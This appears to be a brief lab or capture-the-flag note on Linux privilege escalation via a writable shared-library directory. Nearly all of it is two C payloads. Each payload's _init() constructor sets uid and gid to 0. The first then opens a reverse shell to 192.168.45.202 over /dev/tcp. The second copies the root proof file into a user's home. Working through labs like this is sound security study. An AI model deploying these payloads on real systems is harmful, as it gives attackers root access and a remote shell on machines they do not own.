Path `/usr/local/lib/dev` is writable, so we can write a `.so` file then put in here .

```c
1. 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() 
{
    setgid(0);
    setuid(0);
    system("bash -i >& /dev/tcp/192.168.45.202/80 0>&1");
}

2. 
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() 
{
    setgid(0);
    setuid(0);
    system("cat /root/proof.txt > /home/pablo/proof.txt");
}
```
